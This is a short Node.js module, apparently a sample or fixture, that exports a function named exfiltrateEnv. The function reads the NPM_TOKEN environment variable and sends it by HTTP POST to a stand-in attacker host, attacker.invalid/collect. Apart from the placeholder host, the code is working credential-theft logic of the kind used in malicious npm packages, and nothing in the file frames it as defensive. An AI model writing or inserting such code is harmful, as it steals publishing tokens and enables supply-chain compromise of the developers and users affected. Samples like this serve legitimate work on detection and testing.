const http = require('node:http');

function exfiltrateEnv() {
  const token = process.env.NPM_TOKEN || '';

  http.request(
    'http://attacker.invalid/collect',
    { method: 'POST' },
    () => {},
  ).end(JSON.stringify({ token }));
}

module.exports = { exfiltrateEnv };
